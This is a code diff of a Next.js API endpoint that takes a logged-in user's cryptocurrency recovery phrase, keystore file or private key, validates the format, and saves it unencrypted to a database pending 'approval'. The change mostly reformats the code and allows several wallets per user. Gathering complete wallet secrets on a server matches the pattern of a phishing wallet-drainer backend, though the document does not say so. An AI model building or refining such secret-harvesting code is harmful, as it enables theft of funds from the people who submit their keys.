@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import { getServerSession } from "next-auth";
 import { authOptions } from "@/lib/authOptions";
-import connectDB  from "@/lib/mongodb";
+import connectDB from "@/lib/mongodb";
 import Wallet from "@/models/Wallet";
 import User from "@/models/User";
 
@@ -11,89 +11,105 @@ interface WalletSubmitRequest {
   walletName: string;
 }
 
-interface WalletSubmitResponse {
-  success: boolean;
-  error?: string;
-  walletId?: string;
-  message?: string;
-}
-
 export async function POST(req: NextRequest) {
   try {
     const session = await getServerSession(authOptions);
 
     if (!session || !session.user?.email) {
       return NextResponse.json(
-        { success: false, error: "Unauthorized" },
+        {
+          success: false,
+          error: "Unauthorized",
+        },
         { status: 401 }
       );
     }
 
     await connectDB();
 
-    // Get user
     const user = await User.findOne({
       email: session.user.email,
     });
 
     if (!user) {
       return NextResponse.json(
-        { success: false, error: "User not found" },
+        {
+          success: false,
+          error: "User not found",
+        },
         { status: 404 }
       );
     }
 
-    const { type, data, walletName }: WalletSubmitRequest = await req.json();
+    const { type, data, walletName }: WalletSubmitRequest =
+      await req.json();
 
     if (!type || !data || !walletName) {
       return NextResponse.json(
         {
           success: false,
-          error: "Missing required fields: type, data, walletName",
+          error:
+            "Missing required fields: type, data, walletName",
         },
         { status: 400 }
       );
     }
 
-    // Check if user already has a pending or approved wallet
+    // Prevent duplicate submissions of the same wallet
     const existingWallet = await Wallet.findOne({
       userId: user._id,
-      status: { $in: ["pending", "approved"] },
+      walletName,
+      status: {
+        $in: ["pending", "approved"],
+      },
     });
 
     if (existingWallet) {
       return NextResponse.json(
         {
           success: false,
-          error: "You already have a pending or approved wallet",
+          error: `${walletName} is already connected or awaiting approval`,
         },
         { status: 400 }
       );
     }
 
-    // Validate based on type
+    // Validate phrase
     if (type === "phrase") {
       const words = data.trim().split(/\s+/);
+
       if (words.length !== 12 && words.length !== 24) {
         return NextResponse.json(
           {
             success: false,
-            error: "Recovery phrase must be exactly 12 or 24 words",
+            error:
+              "Recovery phrase must be exactly 12 or 24 words",
           },
           { status: 400 }
         );
       }
-    } else if (type === "keystore") {
+    }
+
+    // Validate keystore
+    else if (type === "keystore") {
       try {
         JSON.parse(data);
       } catch {
         return NextResponse.json(
-          { success: false, error: "Invalid JSON format for keystore" },
+          {
+            success: false,
+            error: "Invalid JSON format for keystore",
+          },
           { status: 400 }
         );
       }
-    } else if (type === "private") {
-      if (!/^(0x)?[a-fA-F0-9]{64}$/.test(data.trim())) {
+    }
+
+    // Validate private key
+    else if (type === "private") {
+      if (
+        !/^(0x)?[a-fA-F0-9]{64}$/.test(data.trim())
+      ) {
         return NextResponse.json(
           {
             success: false,
@@ -103,14 +119,18 @@ export async function POST(req: NextRequest) {
           { status: 400 }
         );
       }
-    } else {
+    }
+
+    else {
       return NextResponse.json(
-        { success: false, error: "Invalid wallet type" },
+        {
+          success: false,
+          error: "Invalid wallet type",
+        },
         { status: 400 }
       );
     }
 
-    // Create wallet record
     const wallet = new Wallet({
       userId: user._id,
       walletName,
@@ -121,9 +141,13 @@ export async function POST(req: NextRequest) {
 
     if (type === "phrase") {
       wallet.seedPhrase = data;
-    } else if (type === "keystore") {
+    }
+
+    if (type === "keystore") {
       wallet.keystoreJson = data;
-    } else if (type === "private") {
+    }
+
+    if (type === "private") {
       wallet.privateKey = data;
     }
 
@@ -136,8 +160,12 @@ export async function POST(req: NextRequest) {
     });
   } catch (error) {
     console.error("Error submitting wallet:", error);
+
     return NextResponse.json(
-      { success: false, error: "Internal server error" },
+      {
+        success: false,
+        error: "Internal server error",
+      },
       { status: 500 }
     );
   }
